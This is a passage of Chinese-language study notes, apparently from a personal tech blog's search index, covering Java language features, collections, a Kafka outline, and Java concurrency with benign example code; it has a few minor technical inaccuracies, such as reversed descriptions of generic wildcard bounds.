final）。\n函数式接口函数式接口是一种特殊的接口，接口内部除静态方法、默认方法、静态常量外只有一个抽象类。\n只有函数式接口才能使用Lambda表达式。\n在Java中，使用@FunctionalInterface注解来标记一个接口为函数式接口，这样编译器就可以检查这个接口是否符合函数式接口的要求（即只有一个抽象方法）。\n方法引用Java方法引用是一种Lambda表达式的简化写法，它可以直接引用已有Java方法来替代Lambda表达式。\n使用方法是，通过::操作符将一个已有方法的引用赋值给一个函数式接口变量，从而创建一个方法引用。\n Java 中 4 种不同方法的引用：\n\n构造器引用：它的语法是Class::new，或者更一般的Class&lt; T &gt;::new实例如下：\nfinal Car car = Car.create( Car::new ); final List&lt; Car &gt; cars = Arrays.asList( car );\n\n静态方法引用：它的语法是Class::static_method，实例如下：\ncars.forEach( Car::collide );\n\n特定类的任意对象的方法引用：它的语法是Class::method实例如下：\ncars.forEach( Car::repair );\n\n特定对象的方法引用：它的语法是instance::method实例如下：\nfinal Car police = Car.create( Car::new ); cars.forEach( police::follow );\n\n@FunctionalInterfacepublic interface Supplier&lt;T&gt; &#123;    T get();&#125; class Car &#123;    //Supplier是jdk1.8的接口，这里和lamda一起使用了    public static Car create(final Supplier&lt;Car&gt; supplier) &#123;        return supplier.get();    &#125;     public static void collide(final Car car) &#123;        System.out.println(&quot;Collided &quot; + car.toString());    &#125;     public void follow(final Car another) &#123;        System.out.println(&quot;Following the &quot; + another.toString());    &#125;     public void repair() &#123;        System.out.println(&quot;Repaired &quot; + this.toString());    &#125;&#125;\n\n闭包闭包（Closure）指的是一个函数（或者方法），可以引用到自己作用域以外的变量。\nJava中的Lambda表达式是闭包，Lambda表达式可以引用其作用域之外的变量，不过，Lambda表达式中引用的作用域外的变量不能被改变。\n异常和错误概述Java中所有的异常（Exception）类型和错误（Error）类型都是 Throwable 类的子类，继承关系见下图。\n\nException ：程序可以处理的异常，可以通过 catch 来进行捕获。Exception 又可以分为 Checked Exception (受检查异常，必须处理) 和 Unchecked Exception (不受检查异常，可以不处理)。\n\nChecked Exception：受检查异常 ，Java 代码在编译过程中，如果受检查异常没有被 catch或者throws 关键字处理的话，就没办法通过编译。\n除了RuntimeException及其子类以外，其他的Exception类及其子类都属于受检查异常 。常见的受检查异常有：IO 相关的异常、ClassNotFoundException、SQLException…。\n\nUnchecked Exception：即不受检查异常 ，Java 代码在编译过程中 ，我们即使不处理不受检查异常也可以正常通过编译。\nRuntimeException 及其子类都统称为非受检查异常，常见的有NullPointerException(空指针错误)、IllegalArgumentException(参数错误比如方法入参类型错误)、NumberFormatException（字符串转换为数字格式错误，IllegalArgumentException的子类）、ArrayIndexOutOfBoundsException（数组越界错误）、ClassCastException（类型转换错误）、ArithmeticException（算术错误）、SecurityException （安全错误比如权限不够）、UnsupportedOperationException(不支持的操作错误比如重复创建同一用户)。\n\n\n\nError：程序无法处理的错误 ，不能通过 catch 来进行捕获。如果发送，Java 虚拟机（JVM）会选择终止进程。\n\n\n\n Throwable类常用方法：\n\n\n\n方法名\n作用\n\n\n\nprintStackTrace\n将Throwable的路径信息打印到标准错误流\n\n\ntoString\n返回Throwable的类名和message\n\n\ngetMessage\n返回Throwable的message（message是调用Exception时传入的参数）\n\n\ngetLocalizedMessage\n返回Throwable的本地化message\n\n\ntry-catch-finallyfinally块里代码是在return前执行的。当在 try 块或 catch 块中遇到 return 语句时，就会执行finally 语句块。\n当 try 语句块和 finally 语句块中都有 return 语句时，try 语句块中的 return 语句会被忽略，因为在执行完finally 语句块后已经return，不会再回到try语句块。\n在某些情况下，finally 中的代码不会被执行。比如如果finally之前虚拟机被终止运行，则finally中的代码就不会被执行。\ntry-with-resource在 Java 中，可以使用 try-with-resources （Java7引入）语句来自动关闭实现了 AutoCloseable 或 Closeable 接口（使用的前提条件）的资源。\n关闭资源在try-with-resource中的执行顺序：在 try-with-resources 语句中，在 try 块的代码执行完毕后，会自动关闭在 try 声明中的资源。任何 catch 或 finally 块都会在声明的资源关闭后运行。\n《Effective Java》中明确指出：\n\n面对必须要关闭的资源，我们总是应该优先使用 try-with-resources 而不是try-finally。随之产生的代码更简短，更清晰，产生的异常对我们也更有用。try-with-resources语句让我们更容易编写必须要关闭的资源的代码，若采用try-finally则几乎做不到这点。\n\n支持try-with-resource的类：\n\nNIO 相关类\n\nChannel 相关类\nAbstractInterruptibleChannel: NIO 抽象通道的基类，提供了可中断的通道操作。\nAbstractSelectableChannel: NIO 抽象可选择通道的基类，提供了选择器注册和取消注册的功能。\nAbstractSelector: NIO 抽象选择器的基类，提供了选择通道的功能。\nAsynchronousFileChannel: 异步文件通道，提供了异步读写文件的能力。\nAsynchronousServerSocketChannel: 异步服务器套接字通道，用于异步处理客户端连接请求。\nAsynchronousSocketChannel: 异步套接字通道，用于异步进行套接字通信。\n\n\n\n\nIO 类\n\n字节流\n\nFileInputStream: 文件输入流，用于从文件中读取字节数据。\nFileOutputStream: 文件输出流，用于向文件中写入字节数据。\nBufferedInputStream: 带缓冲的输入流，提供了高效的读取功能。\nBufferedOutputStream: 带缓冲的输出流，提供了高效的写入功能。\nByteArrayInputStream: 字节数组输入流，用于从字节数组中读取数据。\nByteArrayOutputStream: 字节数组输出流，用于向字节数组中写入数据。\nDataInputStream: 数据输入流，用于读取基本数据类型。\nDataOutputStream: 数据输出流，用于写入基本数据类型。\nObjectInputStream: 对象输入流，用于读取对象数据。\nObjectOutputStream: 对象输出流，用于写入对象数据。\nPipedInputStream: 管道输入流，用于在多个线程之间进行字节数据的通信。\nPipedOutputStream: 管道输出流，用于在多个线程之间进行字节数据的通信。\nSequenceInputStream: 序列输入流，用于将多个输入流串联起来顺序读取数据。\n\n\n字符流\n\nFileReader: 文件字符输入流，用于从文件中读取字符数据。\nFileWriter: 文件字符输出流，用于向文件中写入字符数据。\nBufferedReader: 带缓冲的字符输入流，提供了逐行读取文本数据的功能。\nBufferedWriter: 带缓冲的字符输出流，提供了逐行写入文本数据的功能。\nCharArrayReader: 字符数组输入流，用于从字符数组中读取数据。\nCharArrayWriter: 字符数组输出流，用于向字符数组中写入数据。\nInputStreamReader: 字节流到字符流的桥接器，用于将字节流转换为字符流。\nOutputStreamWriter: 字符流到字节流的桥接器，用于将字符流转换为字节流。\nStringReader: 字符串输入流，\n\n\n\n\n\n泛型概述Java泛型（Generics）是 JDK 5 中引入的一个新特性。\n泛型一般有三种使用方式:泛型类、泛型接口、泛型方法。\n\nJava和C++的不同：\nJava中的泛型没有C++中的特殊template关键字。\n\n泛型类型参数在Java中，泛型类型参数常用的命名约定如下：\n\nT：表示泛型类型的参数。它是最常用的泛型类型参数名称，通常表示任意类型，例如public class Box&lt;T&gt;。\nE：表示集合中的元素类型的参数。它常用于表示集合类中的元素类型，例如List&lt;E&gt;。\nK：表示映射中的键类型的参数。它通常用于表示键-值对中的键类型，例如Map&lt;K, V&gt;。\nV：表示映射中的值类型的参数。它通常用于表示键-值对中的值类型，例如Map&lt;K, V&gt;。\n\nT、E、K和V只是通用的命名约定，并没有强制规定使用这些字母。在实际使用中，可以根据上下文和需求来选择更有意义的类型参数名称。\n通配符?通配符（wildcard type）?代表某种未知类型。\n通配符?的使用方法包括：\n\n?\n? extends Employee\n? super People\n\n其中，extends Employee表示，?代表的是Employee类型的父类；super People表示，?代表的是People类型的子类。\n集合概述Java 集合， 也叫作容器，主要是由两大接口派生而来：一个是 Collection接口，主要用于存放单一元素；另一个是 Map 接口，主要用于存放键值对。对于Collection 接口，下面又有三个主要的子接口：List、Set 和 Queue。\n\n注：图中只列举了主要的继承派生关系，并没有列举所有关系。比方省略了AbstractList, NavigableSet等抽象类以及其他的一些辅助类\n集合数据结构分类Map\n\nHashtable：数组+链表组成的，数组是 Hashtable 的主体，链表则是主要为了解决哈希冲突而存在的。是线程安全的。\nConcurrentHashMap：\nHashMap：JDK1.8 以后在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8）（将链表转换成红黑树前会判断，如果当前数组的长度小于 64，那么会选择先进行数组扩容，而不是转换为红黑树）时，将链表转化为红黑树，以减少搜索时间。HashMap 默认的初始化大小为 16，之后每次扩充，容量变为原来的 2 倍。\nLinkedHashMap：LinkedHashMap 继承自 HashMap，所以它的底层仍然是基于拉链式散列结构即由数组和链表或红黑树组成。另外，LinkedHashMap 在上面结构的基础上，增加了一条双向链表，使得上面的结构可以保持键值对的插入顺序。同时通过对链表进行相应的操作，实现了访问顺序相关逻辑。详细可以查看：《LinkedHashMap 源码详细分析（JDK1.8）》open in new window\nTreeMap：红黑树（自平衡的排序二叉树），实现了NavigableMap接口（对集合内元素的搜索）和SortedMap 接口（对集合中的元素根据键排序，默认是按 key 的升序排序，可以自定义排序的比较器）。相比于HashMap来说 TreeMap 主要多了对集合中的元素根据键排序的能力以及对集合内元素的搜索的能力。\n\nSet\n\nHashSet(无序，唯一): 基于 HashMap 实现的，底层采用 HashMap 来保存元素。\nLinkedHashSet: LinkedHashSet 是 HashSet 的子类，并且其内部是通过 LinkedHashMap 来实现的。有点类似于我们之前说的 LinkedHashMap 其内部是基于 HashMap 实现一样，不过还是有一点点区别的\nTreeSet(有序，唯一): 红黑树(自平衡的排序二叉树)\n\nList\n\nVector：Object[] 数组\nArrayList：Object[] 数组\nLinkedList：双向链表(JDK1.6 之前为循环链表，JDK1.7 取消了循环)\n\nQueue\n\nPriorityQueue: Object[] 数组来实现二叉堆\n\nArrayQueue: Object[] 数组 + 双指针\n\nBlockingQueue（阻塞队列），实现类：\n\nArrayBlockingQueue：使用数组实现的有界阻塞队列。在创建时需要指定容量大小，并支持公平和非公平两种方式的锁访问机制。\n\nLinkedBlockingQueue：使用单向链表实现的可选有界阻塞队列。在创建时可以指定容量大小，如果不指定则默认为Integer.MAX_VALUE。和ArrayBlockingQueue类似， 它也支持公平和非公平的锁访问机制。\n\nPriorityBlockingQueue：支持优先级排序的无界阻塞队列。元素必须实现Comparable接口或者在构造函数中传入Comparator对象，并且不能插入 null 元素。\n\nSynchronousQueue：同步队列，是一种不存储元素的阻塞队列。每个插入操作都必须等待对应的删除操作，反之删除操作也必须等待插入操作。因此，SynchronousQueue通常用于线程之间的直接传递数据。\n\nDelayQueue：延迟队列，其中的元素只有到了其指定的延迟时间，才能够从队列中出队。\n\n……\n\n\n\n\n是否支持存储null不支持存储null：\n\nArrayDeque\n\nPriorityQueue\n\nHashtable（不允许有 null 键和 null 值）\n\nTreeMap（不允许有 null 键，可以有null值）\n\n\n支持存储null：\n\nArrayList\n\nLinkedList\n\nHashMap（可以存储 null 的 key 和 value，但 null 作为键只能有一个，null 作为值可以有多个）\n\nHashSet\n\n\nComparable和ComparatorComparable 接口和 Comparator 接口都是 Java 中用于排序的接口。\n\n\n\n接口名\n抽象方法签名\n包名\n\n\n\nComparable\npublic int compareTo(T o);\njava.lang\n\n\nComparator\nint compare(T o1, T o2);\njava.util\n\n\nComparable和Comparator一个基本的区别特征是，使用 Comparable只能定义一种比较。而使用Comparator可以根据需要为给定类型定义多种比较逻辑。\nComparable\nComparable顾名思义，表示实现了Comparable接口的类型的对象是可比较的。\n类对Comparable接口的compareTo方法的实现，定义了同一个类的不同对象之间进行比较的策略。这被称为类的“自然排序”。\n如果类实现了 Comparable 接口，那么在使用 Collections.sort() 或 Arrays.sort() 方法时，会自动根据 CompareTo 方法定义的自然顺序，对该对象的 List 或 Array 进行排序。\nComparator\nComparator接口和要排序的对象类型之间没有实现（implements）关系。\nSet的两大特性无序性无序性是指存储的数据在底层数组中并非按照数组索引的顺序添加 ，而是根据数据的哈希值决定的。无序性不等于随机性。\n不可重复性\nHashSet检查重复的方法（引自《Head first java》第二版）：\n当你把对象加入HashSet时，HashSet 会先计算对象的hashcode值来判断对象加入的位置，同时也会与其他加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。但是如果发现有相同 hashcode 值的对象，这时会调用equals()方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet 就不会让加入操作成功。\n\nJava8新特性（部分）\nLambda 表达式：Lambda 表达式是一种简洁的语法形式，用于表示匿名函数。它可以用来简化代码，尤其是在使用函数式接口（只有一个抽象方法的接口）时。Lambda 表达式可以使代码更加紧凑和易读。\n函数式接口：Java 8 引入了 java.util.function 包，提供了一组函数式接口，用于支持函数式编程。例如，Predicate、Function、Consumer 等接口可以在 Lambda 表达式中使用，使得函数式编程更加便捷。\nStream API：Stream API 提供了一种流式操作集合数据的方式。它可以用于对集合进行过滤、映射、排序、归约等操作，提供了函数式、流畅的操作方式，可以编写简洁、高效的代码。\n方法引用：方法引用是一种更简洁的 Lambda 表达式的写法，它直接引用现有的方法作为 Lambda 表达式的实现。方法引用可以提高代码的可读性，并且可以重用现有的方法逻辑。\n默认方法（Default Methods）：接口中可以定义默认方法，这些方法具有默认的实现，可以在接口中直接使用，而不需要实现类必须重写这些方法。这样的设计使得在接口的演进过程中可以向现有的接口添加新的方法，而不会破坏现有的实现。\n新的日期&#x2F;时间 API：Java 8 引入了新的日期&#x2F;时间 API（java.time 包），提供了更加强大和易用的日期和时间处理功能。新的 API 解决了旧的 Date 和 Calendar 类的许多问题，并提供了更多的操作和格式化选项。\n\nGuavaGuava（Google Guava）是Google开发的一个开源Java库，提供了许多实用的工具类和函数，用于简化Java开发过程中的常见任务和操作。\nGuava提供了多个模块，包括集合（Collections）、缓存（Caches）、并发（Concurrency）、字符串处理（Strings）、IO操作（IO）、函数式编程（Functional Programming）、原生类型支持（Primitives）、事件总线（EventBus）等。\nReferences\n凯·S. 霍斯特曼. Java核心技术:原书第12版. 卷一, 开发基础. –北京: 机械工业出版社. 2022.5.\nhttps://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html\nhttps://javaguide.cn/java/collection/java-collection-questions-01.html\nhttps://javaguide.cn/java/concurrent/java-concurrent-questions-02.html\n\n","categories":["IT"],"tags":["java基础"]},{"title":"Kafka","url":"/2023/05/06/Kafka/","content":"消息引擎系统设计消息引擎系统（消息中间件）需要考虑的重要因素：\n\n消息设计\nKafka的消息是使用二进制的方式保存，但是依然是结构化的消息。\n\n传输协议设计\nKafka自己设计了一套二进制的消息传输协议，而没有采用现有的序列化框架（如Protocol Buffers）和RPC框架（如Dubbo）。\n\n\nkafka做到高吞吐、低延时的原因：\n\n使用了操作系统的页缓存技术\n\n操作系统的页缓存是在内存中分配的，读写速度快\n\n\nKafka的写入操作采用追加写入（append）的方式，避免了磁盘的随机写操作\n\n使用了零拷贝技术\nKafka在读取消息时会首先尝试从操作系统的页缓存中读取，如果命中就将页缓存中的消息直接发送到网络的Socket上，不需要再经过应用缓存，减少了数据拷贝的次数。\n一个经过良好调优的Kafka服务器（broker）即使在负载较高的情况下，其磁盘的读操作也很少，因为大部分的消息读取操作会直接命中页缓存。\n\n\n消息持久化\nKafka的使用场景Kafka体系架构主题、分区、副本\n生产者\n消费者与消费组\n消息服务器\n生产者消息发送模式分区机制压缩机制拦截器消费者消费模式推送模式拉取模式消费者组偏移量分区拦截器服务端主题和分区消息的持久性消息的传输保障副本和Leader选举高水位线日志压缩与删除消息处理模式消息广播\n消息过滤\n消息批处理\n日志消息处理\n通信模块\n消息结构\n数据存储\n数据刷盘\n","categories":["IT"],"tags":["Kafka"]},{"title":"Java并发编程","url":"/2023/05/07/Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/","content":"线程工具类Thread类Thread类用于创建和启动线程，Thread类对象就是线程对象，内部定义了线程名name、线程所在的线程组group、向JVM申请的堆栈大小stackSize等信息。\nThread类实现了Runnable接口，Runnable接口是一个函数时接口。\n\nThread类内部定义了一个枚举类State，State类中定义了线程的执行状态：\npublic enum State &#123;    //初始化状态    NEW,    //可运行状态，包括就绪状态和运行状态    RUNNABLE,    //阻塞状态    BLOCKED,    //等待状态    WAITING,    //超时等待状态    TIMED_WAITING,    //终止状态    TERMINATED;&#125;\n\n线程局部变量线程局部变量用于保证数据隔离与安全。\n线程局部变量有两种，ThreadLocal和InheritableThreadLocal，其中ThreadLocal在主线程和子线程之间不具备可继承性，而InheritableThreadLocal具备可继承。\nThreadLocalThreadLocal由一个线程的类型为ThreadLocal.ThreadLocalMap的对象threadlocals来保存，ThreadLocalMap是ThreadLocal类的内部类。具体来说，在ThreadLocalMap中，set到ThreadLocal对象的值作为值（value），ThreadLocal对象作为键（key），并且key是一个弱引用。\n因为ThreadLocal对象（key）是一个弱引用，所以当线程销毁后，由于ThreadLocal对象不再被强引用，所以ThreadLocal对象可以被垃圾回收。但是threadlocals中依然存在键值对，所以为了避免内存溢出，还是需要手动移除（remove）ThreadLocal对象。\nThreadLocal的使用方法示例：\nThreadLocal&lt;String&gt; threadLocal = new ThreadLocal&lt;&gt;(); //创建一个用于存储String类型的ThreadLocal变量threadLocal.set(&quot;Hello, ThreadLocal!&quot;); //设置当前线程的ThreadLocal变量值String value = threadLocal.get(); //返回当前线程的ThreadLocal变量值threadLocal.remove(); //清除当前线程的ThreadLocal变量值\n\n每个线程可以创建多个ThreadLocal实例，每个ThreadLocal实例可以用来存储一个特定的值，例如，可以创建两个ThreadLocal实例来存储不同类型的值：\nThreadLocal&lt;String&gt; threadLocal1 = new ThreadLocal&lt;&gt;(); //创建一个用于存储String类型的ThreadLocal变量ThreadLocal&lt;Integer&gt; threadLocal2 = new ThreadLocal&lt;&gt;(); //创建一个用于存储Integer类型的ThreadLocal变量\n\nInheritableThreadLocal使用InheritableThreadLocal创建对象保存的变量具有继承性，子线程调用该对象的get方法可以获取到父线程set到该对象中的值。父线程是创建和启动子线程的线程。\nInheritableThreadLocal的使用方法示例：\nstatic final InheritableThreadLocal&lt;String&gt; INHERITABLE_THREAD_LOCAL = new InheritableThreadLocal&lt;&gt;();public static void main(String[] args) &#123;    INHERITABLE_THREAD_LOCAL.set(&quot;主线程保存的值&quot;);    new Thread(() -&gt; &#123;    String value = INHERITABLE_THREAD_LOCAL.get();    System.out.println(&quot;子线程中访问主线程中保存的局部变量值：&quot; + value);    &#125;).start();&#125;/*输出结果：\t子线程中访问主线程中保存的局部变量值：主线程保存的值*/\n\n通过InheritableThreadLocal对象之所以能够访问到父（parent）线程的inheritableThreadLocals，是因为在创建线程的时候，会将parent线程的inheritableThreadLocals复制一份到子线程的inheritableThreadLocals中。\nFork&#x2F;Join框架Fork&#x2F;Join框架是从Java1.7开始提供的用于执行并行任务的框架，可以将一个比较大的任务拆分成多逻辑相同的小任务，最后汇总每个小任务的执行结果得到最终的结果，思想和Hadoop的MapReduce类似。\nFork&#x2F;Join框架使用了工作窃取算法，即处理完自己所在的任务队列的线程会去执行（窃取）其它线程的任务队列。\nJava提供的Fork&#x2F;Join框架涉及的核心类包括ForkJoinPool类、ForkJoinTask类、ForkJoinWorkerThread类、RecursiveTask类、RecursiveAction类、CountedCompleter类：\n\nForkJoinPool类：实现了Fork&#x2F;Join框架框架的线程池\nForkJoinWorkerThread类：是Fork&#x2F;Join框架的线程池中运行的线程\nForkJoinTask类：是Fork&#x2F;Join框架的任务，任务的处理逻辑在compute()方法中进行定义，提供了fork()和join()方法，分别实现了任务的拆分和合并。实际开发中，一般用它的两个子类RecursiveTask、RecursiveAction。\nRecursiveTask类：是ForkJoinTask的子类，实现了Callable接口，并提供返回结果。\nRecursiveAction类：是ForkJoinTask的子类，实现了Runnable接口，无返回结果。\nCountedCompleter类：任务完成后会触发执行的一个自定义的任务。\n\nJava1.8中引入的并行流就是基于Fork&#x2F;Join框架实现的。\n使用示例（使用Fork&#x2F;Join框架计算1~10000的累加和）：\npublic class ForkJoinTaskComputer extends RecursiveTask&lt;Integer&gt; &#123;    //任务拆分的最小粒度    private static final int MIN_COUNT = 2;    //开始数字    private int start;    //结束数字    private int end;    public ForkJoinTaskComputer(int start, int end) &#123;        this.start = start;        this.end = end;    &#125;    @Override    protected Integer compute() &#123;        int sum = 0;        int count = end - start;        if (count &lt;= MIN_COUNT) &#123;            for (int i = start; i &lt;= end; i++) &#123;                sum += i;            &#125;        &#125; else &#123;            //找到中间值            int middle = start + ((end - start) &gt;&gt; 1);            //生成子任务            ForkJoinTaskComputer leftTaskComputer = new ForkJoinTaskComputer(start, middle);            ForkJoinTaskComputer rightTaskComputer = new ForkJoinTaskComputer(middle + 1, end);            //执行子任务            leftTaskComputer.fork();            rightTaskComputer.fork();            //合并子任务            Integer leftResult = leftTaskComputer.join();            Integer rightResult = rightTaskComputer.join();            //计算总和            sum = leftResult + rightResult;        &#125;        return sum;    &#125;&#125;\n\npublic class ForkJoinTest &#123;    private static final int MIN_COUNT = 1;    private static final int MAX_COUNT = 10_000;    public static void main(String[] args) throws ExecutionException, InterruptedException &#123;        ForkJoinTaskComputer taskComputer = new ForkJoinTaskComputer(MIN_COUNT, MAX_COUNT);        ForkJoinPool forkJoinPool = new ForkJoinPool();        //将计算任务提交到线程池进行执行        ForkJoinTask&lt;Integer&gt; result = forkJoinPool.submit(taskComputer);        System.out.println(&quot;计算结果是&quot; + result.get());    &#125;&#125;/**输出结果：计算结果是50005000*/\n\n在这个例子中，使用Fork&#x2F;Join框架实现了计算1~10000的累加和，通过将大任务拆分成小任务，再将拆分后的小任务提交到线程池进行执行，最后将结果合并得到最终的计算结果。输出的计算结果是50005000，正确。\n线程池工具类Executor接口ExecutorThreadPoolExecutorExecutorService接口AbstractExecutorService抽象类ScheduleExecutorService接口线程线程的创建方式Java 中创建线程的方法有四种：继承 Thread 类、实现 Runnable 接口、实现 Callable 接口并使用FutureTask类以及通过线程池创建线程。\n\n继承 Thread 类：\n\n继承 Thread 类是创建线程最简单的方式，在该类中重写 run() 方法即可实现线程的执行逻辑。可以通过 start() 方法启动线程，如下所示：\nclass MyThread extends Thread &#123;    @Override    public void run() &#123;        // 实现线程执行逻辑    &#125;&#125;MyThread thread = new MyThread();thread.start();\n\n\n实现 Runnable 接口：\n\n实现 Runnable 接口也是一种常见的创建线程的方式，可以将 Runnable 对象传递给 Thread 类，通过 start() 方法启动线程，如下所示：\nclass MyRunnable implements Runnable &#123;    @Override    public void run() &#123;        // 实现线程执行逻辑    &#125;&#125;MyRunnable runnable = new MyRunnable();Thread thread = new Thread(runnable);thread.start();\n\n\n实现 Callable 接口并使用FutureTask类：\n\n与 Runnable 接口相比，Callable 接口可以返回执行结果，并且可以抛出异常。\n但是Callable接口实例不能作为Thread类的target，所以还需要一个搭桥接口，RunnableFuture接口就是Thread和Callable之间的“搭桥接口”。而FutureTask类实现了RunnableFuture接口。RunnableFuture继承了Runnable接口和Future接口。其中Future接口提供的功能有取消执行中的任务、获取任务的执行结果等。\n使用方法如下所示：\nclass MyCallable implements Callable&lt;String&gt; &#123;    @Override    public String call() throws Exception &#123;        System.out.println(&quot;calling&quot;);        return &quot;this is the result of the execute&quot;;    &#125;&#125;public static void main(String[] args) &#123;    MyCallable myCallable = new MyCallable();    FutureTask&lt;String&gt; futureTask = new FutureTask&lt;&gt;(myCallable);    Thread thread = new Thread(futureTask);    thread.start();    try &#123;        System.out.println(futureTask.get()); // 获取任务的执行结果    &#125; catch (InterruptedException | ExecutionException e) &#123;        throw new RuntimeException(e);    &#125;&#125;/*输出结果：    calling    this is the result of the execute*/\n\n\n通过线程池创建线程\n\n操作系统线程生命周期\n初始状态：处于初始状态的线程只是在编程语言层面被创建，在操作系统层面并没有被真正创建。\n可运行状态：线程在操作系统层面真正被创建，可以被分配CPU资源。\n运行状态：处于运行状态的线程已经获取到CPU资源，正在运行。\n休眠状态：线程正在等待，或者正处于阻塞状态（如调用了一个阻塞的API），就可能（只有处在运行状态的线程才可以直接转换成休眠状态或终止状态）进入休眠状态。\n终止状态：线程正常运行结束或出现异常，就可能进入终止状态。\n\nJava线程的生命周期\n初始化状态：线程在Java中被创建（调用new方法），但还没有启动（调用start方法）。\n可运行状态\n就绪状态：对应操作系统线程生命周期中的可运行状态。\n运行状态：对应操作系统线程生命周期中的运行状态。\n\n\n阻塞状态：等待进入临界区。\n等待状态：等待其它线程通知或中断等待。\n超时等待状态：等待其它线程通知或中断等待，如果超过指定时间，当前线程也会进入下一个状态。\n终止状态：表示当前线程执行完毕，包括正常执行结束和异常退出。\n\n线程调度模型目前主流操作系统中主要基于时间片进行线程调度，调度模型可以分为分时调度模型和抢占式调度模型：\n\n分时调度模型：会平均分配CPU时间片，每个线程占用的CPU时间片都是一样的，所有线程会轮流占有CPU时间片。\n抢占式调度模型：按照线程的优先级分配时间片，线程的优先级越高，分配到CPU时间片的概览越大。\n\n线程方法\nstart：启动线程。\nsleep：让当前线程休眠（暂停执行）一段时间，不会释放锁。\nwait：让当前线程暂停执行并释放锁资源。\nnotify：随机唤醒一个因wait调用而处于等待中的线程。\nnotifyAll：唤醒所有因wait调用而处于等待中的线程。\npark：阻塞当前线程，等待被其它线程唤醒，不会释放锁。\nunpark：唤醒指定的线程，使其从等待状态中返回。\njoin：如果线程a调用了线程b的join()方法，则线程a会等待线程b执行完毕后再继续执行。\ninterrupt：如果是作用于对被sleep、wait、join阻塞的线程，会清除线程的中断标记并抛出异常；如果是作用于一个正在运行的线程，会强制终止该线程。\nyield：不会释放锁，只是让出当前线程的CPU执行时间片，回到就绪状态，等待CPU的调度。\n\n线程结束的方式\n等待线程自然执行完毕\nrun()方法执行完毕\n\n\n强制结束线程\n调用Interrupt()方法：推荐使用，原因是interrupt方法并不直接停止线程，而是由线程决定如何响应中断，线程有机会执行释放资源、保持数据一致性等操作。\n调用stop()方法：不推荐使用，原因是使用stop方法存在一些潜在的问题，如不能释放资源、数据不一致等。\n\n\n\n上下文切换当程序中可运行的线程数量大于CPU核心数时，CPU资源会在不同线程之间来回切换，就会发生线程的上下文切换，也叫做线程切换。\n在线程上下文切换时，操作系统会保存运行线程的上下文。\n减少上下文切换的措施：\n\n使用无锁编程\n创建合适的线程数\n使用协程\n\n线程同步线程同步是一种用于协调多个线程并发执行的机制，以确保它们按照特定的顺序或规则访问共享资源，避免数据出现不符合预期的操作结果。\n用户线程和守护线程\n用户线程\n默认情况下主线程和创建的新线程、新线程池都为用户线程\n以线程为例，想要查看线程是否为守护线程只需通过调用 isDaemon() 方法查询即可，如果查询的值为 false 则表示不为守护线程。\n\n守护线程\n守护线程（Daemon Thread）也被称之为后台线程或服务线程，当程序中的用户线程全部执行结束之后，守护线程也会跟随结束。\nJVM中的垃圾回收线程、JIT编译线程都是守护线程\n守护线程可以按来源分两种：\n\nJVM中带有的守护线程\n\n将默认的用户线程修改为守护线程\n\n如果是线程，则可以通过设置 setDaemon(true) 方法将用户线程直接修改为守护线程\n如果是线程池则需要通过 ThreadFactory 将线程池中的每个线程都为守护线程才行，接下来我们分别来实现一下\n\n\n\n\n\n线程池线程池的状态线程池在运行过程中涉及的状态包括RUNNING、SHUTDOWN、STOP、TIDYING、TERMINATED\nRUNNING：表示线程池处在运行状态，能处理正在执行的任务，能处理阻塞队列中的任务，能够接收新提交的任务。\nSHUTDOWN：表示线程池处在关闭状态，能处理正在执行的任务，能处理阻塞队列中的任务，但是不能接收新提交的任务。如果线程池处于RUNNING状态，此时调用shutdown()方法会使线程进入SHUTDOWN状态。\nSTOP：表示线程池处于停止状态，线程会中断正在执行的任务，不能处理阻塞队列中的任务，也不能接收新提交的任务。如果线程池处于RUNNING或者SHUTDOWN状态，那么调用线程池的shutdownNow()方法会使线程池进入STOP状态。\nTIDYING：如果线程池中已经没有正在执行的任务，并且线程池的阻塞队列为空，线程池就会进入TIDYING状态。当线程池处于SHUTDOWN或者STOP状态时，如果满足TIDYING状态的条件，线程池就会进入TIDYING状态。\nTERMINATED：如果线程池处于TIDYING状态，此时调用线程池的terminated方法，线程池就会进入TERMINATED状态。\n线程池的创建方式Java中线程池的创建有四个类可以实现，分别是Executors、ThreadPoolExecutor、ForkJoinPool、ScheduledThreadPoolExecutor。\n\n使用Executors类创建线程池\nExecutors 提供了一些静态工厂方法来创建不同类型的线程池，包括newFixedThreadPool、newWorkStealingPool、newCachedThreadPool、newScheduledThreadPool、newSingleThreadExecutor、newSingleThreadScheduledExecutor等。这种方式适用于简单的场景，但缺少可定制性，无法精细调整线程池的参数。其中newWorkStealingPool是JDK1.8新增的方法，表示创建一个具有并行级别的线程池，比Executors类中断其它方法创建的线程池有更高的并发性能。\n在Executors类中，newFixedThreadPool、newCachedThreadPool和newSingleThreadExecutor都是调用ThreadPoolExecutor类的构造方法实现的。所以《阿里巴巴Java开发手册》推荐直接调用ThreadPoolExecutor类的构造方法创建线程。\nnewWorkStealingPool是调用ForkJoinPool类的构造方法实现的。\nnewScheduledThreadPool和newSingleThreadScheduledExecutor是调用ScheduledThreadPoolExecutor类的构造方法实现的。\nExecutors类的使用示例：\n// 创建一个固定大小的线程池ExecutorService executor = Executors.newFixedThreadPool(10);\n\n使用ThreadPoolExecutor类创建线程池\n使用 ThreadPoolExecutor 构造函数手动创建线程池，可以自定义线程池的参数，参数如下：\npublic ThreadPoolExecutor(int corePoolSize, //线程池的核心线程数                              int maximumPoolSize, //最大线程数                              long keepAliveTime, //空闲线程存活时间                              TimeUnit unit, //空闲线程存活时间单位                              BlockingQueue&lt;Runnable&gt; workQueue, //阻塞队列                              ThreadFactory threadFactory, // 用来创建线程的线程工厂                              RejectedExecutionHandler handler) //拒绝处理任务时的策略\n\n\n当线程池中的线程数小于corePoolSize，即使存在空闲线程，也会创建新的线程。\n当线程池中的线程数大于corePoolSize，小于maximunPoolSize，那么只有当workQueue队列已满时才会创建新线程来执行任务。\n如果线程池中运行的线程数等于maximunPoolSize，并且workQueue队列已满，就会触发拒绝处理任务时的策略（handler）来拒绝任务的执行。\n\nThreadPoolExecutor类的使用示例：\n// 手动创建 ThreadPoolExecutor 对象// 除ArrayBlockingQueue外还有LinkedBlockingQueueBlockingQueue&lt;Runnable&gt; workQueue = new ArrayBlockingQueue&lt;&gt;(100); ThreadPoolExecutor executor = 